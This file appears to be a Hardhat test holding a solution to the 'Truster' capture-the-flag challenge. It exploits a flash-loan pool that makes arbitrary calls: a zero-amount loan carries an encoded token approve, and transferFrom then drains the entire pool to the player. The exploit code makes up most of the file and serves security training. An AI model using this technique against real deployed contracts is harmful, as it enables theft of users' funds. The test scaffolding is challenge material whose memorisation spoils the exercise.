const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const approveCall = token.interface.encodeFunctionData("approve", [
      player.address,
      TOKENS_IN_POOL,
    ]);

    console.log("Created the approveCall data: ", approveCall);

    await pool
      .connect(player)
      .flashLoan(0, player.address, token.address, approveCall);

    console.log(
      "Called the flashLoan function with zero, just to get approved"
    );

    await token
      .connect(player)
      .transferFrom(pool.address, player.address, TOKENS_IN_POOL);

    console.log("Transferred all tokens from the pool to the player");
    console.log("Player balance: ", await token.balanceOf(player.address));
    console.log("Pool balance: ", await token.balanceOf(pool.address));
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
